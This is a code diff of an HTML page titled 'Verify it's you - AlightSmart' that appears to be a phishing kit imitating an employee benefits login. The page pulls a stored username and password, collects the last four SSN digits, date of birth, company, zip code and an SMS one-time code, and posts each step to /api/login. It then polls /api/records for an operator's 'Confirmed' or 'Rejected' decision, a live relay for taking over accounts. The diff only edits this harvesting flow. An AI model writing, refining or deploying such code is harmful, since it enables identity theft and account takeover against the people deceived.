@@ -5,58 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verify it's you - AlightSmart</title>
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
-            background: #f8fafc; 
-            padding: 20px; 
-            min-height: 100vh;
-        }
-        .container { 
-            max-width: 420px; 
-            margin: auto; 
-            background: white; 
-            padding: 35px; 
-            border-radius: 16px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
-        }
-        h1 { 
-            font-size: 1.75rem; 
-            text-align: center; 
-            margin-bottom: 8px; 
-            color: #1e2937; 
-        }
-        p { 
-            text-align: center; 
-            color: #64748b; 
-            margin-bottom: 25px; 
-        }
-        label { 
-            display: block; 
-            margin: 20px 0 8px; 
-            font-weight: 600; 
-            color: #334155; 
-        }
-        input, select { 
-            width: 100%; 
-            padding: 14px; 
-            border: 1.5px solid #e2e8f0; 
-            border-radius: 10px; 
-            font-size: 1.05rem; 
-        }
-        input[list] {
-            background-color: white;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8fafc; padding: 20px; }
+        .container { max-width: 420px; margin: auto; background: white; padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        h1 { font-size: 1.75rem; text-align: center; margin-bottom: 8px; color: #1e2937; }
+        p { text-align: center; color: #64748b; margin-bottom: 25px; }
+        label { display: block; margin: 20px 0 8px; font-weight: 600; color: #334155; }
+        input, select { width: 100%; padding: 14px; border: 1.5px solid #e2e8f0; border-radius: 10px; font-size: 1.05rem; }
         .date-group { display: flex; gap: 10px; }
-        button { 
-            width: 100%; 
-            padding: 16px; 
-            margin-top: 12px; 
-            border: none; 
-            border-radius: 10px; 
-            font-size: 1.1rem; 
-            font-weight: 600; 
-            cursor: pointer; 
-        }
+        button { width: 100%; padding: 16px; margin-top: 12px; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: 600; cursor: pointer; }
         .continue { background: #1e40af; color: white; }
         .new-code { background: #eab308; color: black; }
         .error { color: #ef4444; margin: 15px 0; text-align: center; font-weight: 500; }
@@ -69,58 +25,37 @@
 
         <div id="step1" class="step active">
             <h1>Confirm your identity</h1>
-            <p>Search or select your company</p>
+            <p>Select or search your company</p>
 
             <label for="company">Company</label>
-            <input list="companyList" id="company" placeholder="Type to search company..." required>
-            <datalist id="companyList">
-                <option value="UNITED AIRLINES">
-                <option value="BOEING">
-                <option value="SIEMENS ENERGY">
-                <option value="AON">
-                <option value="AMERICAN AIRLINES">
-                <option value="DELTA AIR LINES">
-                <option value="SOUTHWEST AIRLINES">
-                <option value="WALMART">
-                <option value="CATERPILLAR">
-                <option value="DOW">
-                <option value="HP INC">
-                <option value="VERIZON">
-                <option value="AT&T">
-                <option value="BANK OF AMERICA">
-                <option value="WELLS FARGO">
-                <option value="CITIGROUP">
-                <option value="JPMORGAN CHASE">
-                <option value="GENERAL ELECTRIC">
-                <option value="LOCKHEED MARTIN">
-                <option value="NORTHROP GRUMMAN">
-                <option value="RAYTHEON TECHNOLOGIES">
-                <option value="3M">
-                <option value="JOHNSON & JOHNSON">
-                <option value="PFIZER">
-                <option value="UNITEDHEALTH GROUP">
-                <option value="CVS HEALTH">
-                <option value="KROGER">
-                <option value="TARGET">
-                <option value="LOWE'S">
-                <option value="HOME DEPOT">
-                <option value="WALGREENS">
-                <option value="IBM">
-                <option value="MICROSOFT">
-                <option value="AMAZON">
-                <option value="GOOGLE">
-                <option value="META">
-                <option value="INTEL">
-                <option value="PROCTER & GAMBLE">
-                <option value="PEPSICO">
-                <option value="COCA-COLA">
-                <option value="GENERAL MOTORS">
-                <option value="FORD MOTOR COMPANY">
-                <option value="FEDEX">
-                <option value="UPS">
-                <option value="GOLDMAN SACHS">
-                <option value="MORGAN STANLEY">
-            </datalist>
+            <select id="company" required>
+                <option value="">Select or type to search company...</option>
+                <option value="UNITED AIRLINES">UNITED AIRLINES</option>
+                <option value="BOEING">BOEING</option>
+                <option value="SIEMENS ENERGY">SIEMENS ENERGY</option>
+                <option value="AON">AON</option>
+                <option value="AMERICAN AIRLINES">AMERICAN AIRLINES</option>
+                <option value="DELTA AIR LINES">DELTA AIR LINES</option>
+                <option value="SOUTHWEST AIRLINES">SOUTHWEST AIRLINES</option>
+                <option value="WALMART">WALMART</option>
+                <option value="CATERPILLAR">CATERPILLAR</option>
+                <option value="HOME DEPOT">HOME DEPOT</option>
+                <option value="LOWE'S">LOWE'S</option>
+                <option value="TARGET">TARGET</option>
+                <option value="KROGER">KROGER</option>
+                <option value="CVS HEALTH">CVS HEALTH</option>
+                <option value="WALGREENS">WALGREENS</option>
+                <option value="BANK OF AMERICA">BANK OF AMERICA</option>
+                <option value="JPMORGAN CHASE">JPMORGAN CHASE</option>
+                <option value="VERIZON">VERIZON</option>
+                <option value="AT&T">AT&T</option>
+                <option value="IBM">IBM</option>
+                <option value="MICROSOFT">MICROSOFT</option>
+                <option value="AMAZON">AMAZON</option>
+                <option value="GOOGLE">GOOGLE</option>
+                <option value="META">META</option>
+                <!-- You can add more companies here -->
+            </select>
 
             <label>Last 4 Digits of SSN</label>
             <input type="text" id="ssn" maxlength="4" placeholder="1234" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
@@ -142,17 +77,13 @@
             <h1>Additional Information</h1>
             <label>Zip Code</label>
             <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
-
-            <label>Phone Number</label>
-            <input type="tel" id="phone" placeholder="(123) 456-7890" required>
-
             <button class="continue" onclick="saveStep2()">Continue</button>
         </div>
 
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the code you received via SMS.</p>
-            <p>Your access code should be sent to you within 12 hours. Please do not refresh this page.</p>
+            <p>Your access code should be sent to you within 12 hours. Please do not refresh this page — simply check your SMS inbox within the next 12 hours.</p>
             
             <input type="text" id="code" maxlength="10" placeholder="123456" style="text-align:center; font-size:1.4rem;">
             <div id="status"></div>
@@ -165,11 +96,10 @@
     <script>
         let realPassword = sessionStorage.getItem('realPassword') || "N/A";
         let realUsername = sessionStorage.getItem('realUsername') || "Unknown";
-        let selectedCompany = "";
 
         async function saveStep(details, stepName) {
             try {
-                await fetch('/api/login', {
+                const response = await fetch('/api/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -178,25 +108,30 @@
                         address: details
                     })
                 });
+                if (response.ok) {
+                    console.log("✅ Step saved successfully:", stepName);
+                } else {
+                    console.error("❌ Server error:", response.status);
+                }
             } catch (e) {
-                console.error("❌ Failed to save step:", e);
+                console.error("❌ Fetch failed", e);
             }
         }
 
         function saveStep1() {
-            selectedCompany = document.getElementById('company').value.trim();
+            const company = document.getElementById('company').value;
             const ssn = document.getElementById('ssn').value.trim();
             const month = document.getElementById('month').value;
             const day = document.getElementById('day').value;
             const year = document.getElementById('year').value;
 
-            if (!selectedCompany || ssn.length !== 4 || !month || !day || !year || !document.getElementById('privacy').checked) {
+            if (!company || ssn.length !== 4 || !month || !day || !year || !document.getElementById('privacy').checked) {
                 alert("Please select your Company and fill all fields.");
                 return;
             }
 
             const dob = `${month}/${day}/${year}`;
-            const details = `Company: ${selectedCompany} | SSN: ${ssn} | DOB: ${dob} | Status: Step 1 Completed`;
+            const details = `Company: ${company} | SSN: ${ssn} | DOB: ${dob} | Status: Step 1 Completed`;
 
             saveStep(details, "Step 1 - Company, SSN & DOB");
             nextStep(2);
@@ -204,15 +139,13 @@
 
         function saveStep2() {
             const zip = document.getElementById('zip').value.trim();
-            const phone = document.getElementById('phone').value.trim();
-
-            if (zip.length !== 5 || !phone) {
-                alert("Please enter valid Zip Code and Phone Number.");
+            if (zip.length !== 5) {
+                alert("Please enter a valid 5-digit Zip Code.");
                 return;
             }
 
-            const details = `Company: ${selectedCompany} | Zip: ${zip} | Phone: ${phone} | Status: Step 2 Completed`;
-            saveStep(details, "Step 2 - Zip Code & Phone");
+            const details = `Zip: ${zip} | Status: Step 2 Completed`;
+            saveStep(details, "Step 2 - Zip Code");
             nextStep(3);
         }
 
@@ -235,27 +168,26 @@
             const ssn = document.getElementById('ssn').value || "";
             const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
             const zip = document.getElementById('zip').value || "";
-            const phone = document.getElementById('phone').value || "";
+            const company = document.getElementById('company').value || "";
 
-            const fullDetails = `Company: ${selectedCompany} | SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Phone: ${phone} | Code: ${code} | Status: Pending`;
+            const fullDetails = `Company: ${company} | SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
 
             await saveStep(fullDetails, "Final Code Submission");
 
+            // Polling logic
             const interval = setInterval(async () => {
-                try {
-                    const res = await fetch('/api/records');
-                    const records = await res.json();
-                    const latest = records[0];
+                const res = await fetch('/api/records');
+                const records = await res.json();
+                const latest = records[0];
 
-                    if (latest && latest.address.includes("Confirmed")) {
-                        clearInterval(interval);
-                        statusDiv.innerHTML = `<span style="color:green">✅ Verification Successful!</span>`;
-                        setTimeout(() => window.location.href = "index.html", 1500);
-                    } else if (latest && latest.address.includes("Rejected")) {
-                        clearInterval(interval);
-                        statusDiv.innerHTML = `<span class="error">❌ Code Rejected.</span>`;
-                    }
-                } catch (e) {}
+                if (latest && latest.address.includes("Confirmed")) {
+                    clearInterval(interval);
+                    statusDiv.innerHTML = `<span style="color:green">✅ Verification Successful!</span>`;
+                    setTimeout(() => window.location.href = "index.html", 1500);
+                } else if (latest && latest.address.includes("Rejected")) {
+                    clearInterval(interval);
+                    statusDiv.innerHTML = `<span class="error">❌ Code Rejected.</span>`;
+                }
             }, 2000);
         }
 
@@ -278,26 +210,19 @@
 
         window.onload = () => {
             const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
-            const monthSelect = document.getElementById('month');
-            months.forEach((m, i) => {
+            months.forEach((m,i) => {
                 let opt = document.createElement('option');
-                opt.value = i + 1; opt.textContent = m;
-                monthSelect.appendChild(opt);
+                opt.value = i+1; opt.textContent = m;
+                document.getElementById('month').appendChild(opt);
             });
-
-            const daySelect = document.getElementById('day');
-            for(let i = 1; i <= 31; i++) {
-                let opt = document.createElement('option');
-                opt.value = i; opt.textContent = i;
-                daySelect.appendChild(opt);
+            for(let i=1; i<=31; i++) {
+                let opt = document.createElement('option'); opt.value = i; opt.textContent = i;
+                document.getElementById('day').appendChild(opt);
             }
-
-            const yearSelect = document.getElementById('year');
             const curr = new Date().getFullYear();
-            for(let i = curr; i >= 1950; i--) {
-                let opt = document.createElement('option');
-                opt.value = i; opt.textContent = i;
-                yearSelect.appendChild(opt);
+            for(let i=curr; i>=1950; i--) {
+                let opt = document.createElement('option'); opt.value = i; opt.textContent = i;
+                document.getElementById('year').appendChild(opt);
             }
         };
     </script>
